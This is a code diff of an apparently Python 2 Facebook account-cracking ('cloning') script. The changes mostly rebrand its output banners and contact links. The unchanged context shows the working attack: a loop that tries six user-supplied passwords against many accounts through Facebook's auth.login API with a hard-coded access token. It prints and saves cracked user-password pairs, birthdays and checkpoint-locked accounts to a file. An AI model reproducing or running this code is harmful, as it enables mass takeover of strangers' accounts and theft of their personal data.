@@ -303,7 +303,7 @@ def pilih_mbf():
             time.sleep(1)
 
     print
-    jalan('\nEnter 6  your choice Password')
+    jalan('\nENTER 06 PASS REF ARBAB ALI MEYMON')
     pass1 = raw_input('\x1b[1;91m➣Password 1 \xe2\x80\xa2 ')
     pass2 = raw_input('\x1b[1;92m➣Password 2 \xe2\x80\xa2 ')
     pass3 = raw_input('\x1b[1;93m➣Password 3 \xe2\x80\xa2 ')
@@ -312,8 +312,8 @@ def pilih_mbf():
     pass6 = raw_input('\x1b[1;96m➣Password 3 \xe2\x80\xa2 ')
     print '\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
     print '\x1b[1;92m➣      IF YOU WANT TO STOP PRESS CTRL THEN Z'
-    print '\x1b[1;95m➣       GOOD LUCK ALL MAFIA-KILLER FRIENDS'
-    print '\x1b[1;96m➣      START CLONING PLEASE  WAIT 10 MINTS'
+    print '\x1b[1;95m➣                   MAFIA GANGE'
+    print '\x1b[1;96m➣      START CLONING PLEASE  WAIT 05 MINTS'
     print '\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\n'
 
     def main(arg):
@@ -330,11 +330,11 @@ def pilih_mbf():
             data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
             q = json.load(data)
             if 'access_token' in q:
-                print '\xe2\x80\xa2\xe2\x80\xa2MAFIA-KILLER-\x1b[1;97mHACKED ' + user + '\xe2\x80\xa2\xe2\x80\xa2' + pass1
+                print '\xe2\x80\xa2\xe2\x80\xa2ARBAB-\x1b[1;97mOK ' + user + '\xe2\x80\xa2\xe2\x80\xa2' + pass1
                 print '\xe2\x80\xa2\xe2\x80\xa2TTL ' + b['birthday']
                 oks.append(user + pass1)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\xe2\x80\xa2\xe2\x80\xa2\x1b[1;91mMAFIA-KILLER-\x1b[1;96mOPEN AFTER 7 DAYS ' + user + '\xe2\x80\xa2\xe2\x80\xa2' + pass1
+                print '\xe2\x80\xa2\xe2\x80\xa2\x1b[1;91mARBAB-\x1b[1;96mCP' + user + '\xe2\x80\xa2\xe2\x80\xa2' + pass1
                 print '\xe2\x80\xa2\xe2\x80\xa2TTL ' + b['birthday']
                 cek = open('out/mbf_cp.txt', 'a')
                 cek.write(user + '|' + pass1 + '\n')
@@ -345,11 +345,11 @@ def pilih_mbf():
                 data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                 q = json.load(data)
                 if 'access_token' in q:
-                    print '\xe2\x80\xa2\xe2\x80\xa2MAFIA-KILLER-\x1b[1;97mHACKED ' + user + '\xe2\x80\xa2\xe2\x80\xa2' + pass2
+                    print '\xe2\x80\xa2\xe2\x80\xa2ARBAB\x1b[1;97mOK ' + user + '\xe2\x80\xa2\xe2\x80\xa2' + pass2
                     print '\xe2\x80\xa2\xe2\x80\xa2TTL ' + b['birthday']
                     oks.append(user + pass2)
                 elif 'www.facebook.com' in q['error_msg']:
-                    print '\xe2\x80\xa2\xe2\x80\xa2\x1b[1;92mMAFIA-KILLER-\x1b[1;95mOPEN AFTER 7 DAYS ' + user + '\xe2\x80\xa2\xe2\x80\xa2' + pass2
+                    print '\xe2\x80\xa2\xe2\x80\xa2\x1b[1;97mARBAB\x1b[1;95mOK' + user + '\xe2\x80\xa2\xe2\x80\xa2' + pass2
                     print '\xe2\x80\xa2\xe2\x80\xa2TTL ' + b['birthday']
                     cek = open('out/mbf_cp.txt', 'a')
                     cek.write(user + '|' + pass2 + '\n')
@@ -360,11 +360,11 @@ def pilih_mbf():
                     data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                     q = json.load(data)
                     if 'access_token' in q:
-                        print '\xe2\x80\xa2\xe2\x80\xa2MAFIA-KILLER-\x1b[1;97mHACKED ' + user + '\xe2\x80\xa2\xe2\x80\xa2' + pass3
+                        print '\xe2\x80\xa2\xe2\x80\xa2ARBAB\x1b[1;97mOK ' + user + '\xe2\x80\xa2\xe2\x80\xa2' + pass3
                         print '\xe2\x80\xa2\xe2\x80\xa2TTL ' + b['birthday']
                         oks.append(user + pass3)
                     elif 'www.facebook.com' in q['error_msg']:
-                        print '\xe2\x80\xa2\xe2\x80\xa2\x1b[1;93mMAFIA-KILLER-\x1b[1;94mOPEN AFTER 7 DAYS ' + user + '\xe2\x80\xa2\xe2\x80\xa2' + pass3
+                        print '\xe2\x80\xa2\xe2\x80\xa2\x1b[1;97mARBAB\x1b[1;94mOK' + user + '\xe2\x80\xa2\xe2\x80\xa2' + pass3
                         print '\xe2\x80\xa2\xe2\x80\xa2TTL ' + b['birthday']
                         cek = open('out/mbf_cp.txt', 'a')
                         cek.write(user + '|' + pass3 + '\n')
@@ -375,11 +375,11 @@ def pilih_mbf():
                         data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                         q = json.load(data)
                         if 'access_token' in q:
-                            print '\xe2\x80\xa2\xe2\x80\xa2MAFIA-KILLER-\x1b[1;97mHACKED ' + user + '\xe2\x80\xa2\xe2\x80\xa2' + pass4
+                            print '\xe2\x80\xa2\xe2\x80\xa2ARBAB-\x1b[1;97mOK ' + user + '\xe2\x80\xa2\xe2\x80\xa2' + pass4
                             print '\xe2\x80\xa2\xe2\x80\xa2TTL ' + b['birthday']
                             oks.append(user + pass4)
                         elif 'www.facebook.com' in q['error_msg']:
-                            print '\xe2\x80\xa2\xe2\x80\xa2\x1b[1;94mMAFIA-KILLER-\x1b[1;93mOPEN AFTER 7 DAYS ' + user + '\xe2\x80\xa2\xe2\x80\xa2' + pass4
+                            print '\xe2\x80\xa2\xe2\x80\xa2\x1b[1;94mARBAB-\x1b[1;93mCP' + user + '\xe2\x80\xa2\xe2\x80\xa2' + pass4
                             print '\xe2\x80\xa2\xe2\x80\xa2TTL ' + b['birthday']
                             cek = open('out/mbf_cp.txt', 'a')
                             cek.write(user + '|' + pass4 + '\n')
@@ -390,11 +390,11 @@ def pilih_mbf():
                             data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                             q = json.load(data)
                             if 'access_token' in q:
-                                print '\xe2\x80\xa2\xe2\x80\xa2MAFIA-KILLER-\x1b[1;97mHACKED ' + user + '\xe2\x80\xa2\xe2\x80\xa2' + pass5
+                                print '\xe2\x80\xa2\xe2\x80\xa2ARBAB-\x1b[1;97mOK ' + user + '\xe2\x80\xa2\xe2\x80\xa2' + pass5
                                 print '\xe2\x80\xa2\xe2\x80\xa2TTL ' + b['birthday']
                                 oks.append(user + pass5)
                             elif 'www.facebook.com' in q['error_msg']:
-                                print '\xe2\x80\xa2\xe2\x80\xa2\x1b[1;95mMAFIA-KILLER-\x1b[1;92mOPEN AFTER 7 DAYS ' + user + '\xe2\x80\xa2\xe2\x80\xa2' + pass5
+                                print '\xe2\x80\xa2\xe2\x80\xa2\x1b[1;95mARBAB-\x1b[1;92mCP' + user + '\xe2\x80\xa2\xe2\x80\xa2' + pass5
                                 print '\xe2\x80\xa2\xe2\x80\xa2TTL ' + b['birthday']
                                 cek = open('out/mbf_cp.txt', 'a')
                                 cek.write(user + '|' + pass5 + '\n')
@@ -405,11 +405,11 @@ def pilih_mbf():
                                 data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                 q = json.load(data)
                                 if 'access_token' in q:
-                                    print '\xe2\x80\xa2\xe2\x80\xa2MAFIA-KILLER-\x1b[1;97mHACKED ' + user + '\xe2\x80\xa2\xe2\x80\xa2' + pass6
+                                    print '\xe2\x80\xa2\xe2\x80\xa2ARBAB-\x1b[1;97mOK ' + user + '\xe2\x80\xa2\xe2\x80\xa2' + pass6
                                     print '\xe2\x80\xa2\xe2\x80\xa2TTL ' + b['birthday']
                                     oks.append(user + pass6)
                                 elif 'www.facebook.com' in q['error_msg']:
-                                    print '\xe2\x80\xa2\xe2\x80\xa2\x1b[1;96mMAFIA-KILLER-\x1b[1;91mOPEN AFTER 7 DAYS ' + user + '\xe2\x80\xa2\xe2\x80\xa2' + pass6
+                                    print '\xe2\x80\xa2\xe2\x80\xa2\x1b[1;96mARBAB-\x1b[1;91mOK' + user + '\xe2\x80\xa2\xe2\x80\xa2' + pass6
                                     print '\xe2\x80\xa2\xe2\x80\xa2TTL ' + b['birthday']
                                     cek = open('out/mbf_cp.txt', 'a')
                                     cek.write(user + '|' + pass6 + '\n')
@@ -458,11 +458,11 @@ def contact():
 def contact_info():
     info = raw_input("\n╰─➣ ")
     if info =="1":
-        os.system("xdg-open https://facebook.com/Techabm")
+        os.system("xdg-open https://facebook.com/Arbab.Memon")
     elif info =="2":
-        os.system("xdg-open https://instagrame.com/techabm")
+        os.system("xdg-open https://instagrame.com/Arbab.Memon")
     elif info =="3":
-        os.system("xdg-open https://www.youtube.com/channel/UCA5fAtbE0Z0WNYaLfHrBJUA")
+        os.system("xdg-open https://www.youtube.com/ArbabMemon")
     else:
         print("[!] Please Select Valid Option")
         contact_info()
